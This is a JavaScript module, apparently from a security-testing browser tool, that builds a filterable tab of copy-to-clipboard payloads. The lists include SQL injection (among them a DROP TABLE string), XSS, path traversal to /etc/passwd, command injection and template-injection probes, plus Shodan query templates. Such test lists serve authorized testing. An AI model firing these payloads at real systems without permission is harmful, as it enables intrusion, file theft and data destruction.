/**
 * tabs/payloads.js
 * ---------------------------------------------------------------------------
 * Payloads tab: categorized copy-to-clipboard payloads with a live filter.
 * Uses the shared HulkTabs.makeCopyButton (no more duplicated button code).
 * Payload strings are static data — rendered via textContent.
 * ---------------------------------------------------------------------------
 */
(() => {
  "use strict";

  const T = window.HulkTabs;
  const U = window.HulkUtils;

  const CATEGORIES = {
    "SQL Injection": [
      "' OR 1=1--",
      "\" OR 1=1--",
      "' OR '1'='1",
      "' OR 'x'='x",
      "admin'--",
      "admin' OR 1=1--",
      "' UNION SELECT NULL--",
      "' AND sleep(5)--",
      "1' ORDER BY 1--",
      "'; DROP TABLE users--"
    ],
    "XSS": [
      "<script>alert(1)</script>",
      "\"><script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "javascript:alert(1)",
      "\"><svg/onload=alert(document.domain)>",
      "<iframe src=\"javascript:alert(1)\">"
    ],
    "Path Traversal": [
      "../../../etc/passwd",
      "..%2f..%2f..%2fetc%2fpasswd",
      "....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f",
      "..%252f..%252fetc%252fpasswd",
      "/etc/passwd",
      "..\\..\\..\\windows\\win.ini"
    ],
    "Command Injection": [
      ";id",
      "|id",
      "$(id)",
      "`id`",
      ";ls -la",
      "|cat /etc/passwd",
      "%0a id",
      "ping -c 5 127.0.0.1"
    ],
    "SSTI": [
      "{{7*7}}",
      "${7*7}",
      "<%= 7*7 %>",
      "{{7*'7'}}",
      "#{7*7}",
      "{{config}}"
    ],
    "Shodan Templates": [
      "ip:",
      "net:",
      "cidr:",
      "asn:",
      "hostname:",
      "org:\"\"",
      "isp:\"\"",
      "http.title:\"\"",
      "http.html:\"\"",
      "http.status:",
      "ssl.cert.subject.cn:\"\"",
      "port:",
      "product:\"\"",
      "version:",
      "country:",
      "city:\"\"",
      "vuln:CVE-",
      "before:",
      "after:"
    ]
  };

  /** @param {string} text */
  function matches(text, query) {
    return text.toLowerCase().includes(query);
  }

  function init() {
    const pane = document.getElementById("pane-payloads");
    pane.replaceChildren();

    // Filter box
    const filter = document.createElement("div");
    filter.className = "filter-box";
    const searchIcon = document.createElement("span");
    searchIcon.className = "filter-icon";
    searchIcon.innerHTML = T.icon("search");
    const input = document.createElement("input");
    input.type = "search";
    input.className = "field";
    input.placeholder = "Filter payloads…";
    input.setAttribute("aria-label", "Filter payloads");
    input.setAttribute("autocomplete", "off");
    filter.append(searchIcon, input);
    pane.appendChild(filter);

    const accordions = [];

    for (const [category, payloads] of Object.entries(CATEGORIES)) {
      // All accordions start collapsed — the filter box finds anything, and
      // opening one category at a time keeps the list scannable.
      const details = document.createElement("details");
      details.className = "accordion";

      const summary = document.createElement("summary");
      const name = document.createElement("span");
      name.textContent = category;
      const badge = document.createElement("span");
      badge.className = "count-badge";
      badge.textContent = String(payloads.length);
      summary.append(name, badge);
      details.appendChild(summary);

      const body = document.createElement("div");
      body.className = "accordion-body";
      for (const payload of payloads) {
        body.appendChild(T.makeCopyButton(payload));
      }
      details.appendChild(body);
      pane.appendChild(details);
      accordions.push({ details, category, payloads });
    }

    // Live filter (debounced)
    input.addEventListener("input", U.debounce(() => {
      const q = input.value.trim().toLowerCase();
      for (const { details, category, payloads } of accordions) {
        if (!q) {
          details.hidden = false;
          details.querySelectorAll(".copy-btn").forEach((b) => { b.hidden = false; });
          continue;
        }
        const catMatch = matches(category, q);
        details.hidden = !catMatch && !payloads.some((p) => matches(p, q));
        details.querySelectorAll(".copy-btn").forEach((btn, i) => {
          btn.hidden = !catMatch && !matches(payloads[i], q);
        });
      }
    }, 150));
  }

  T.register("payloads", init);
})();
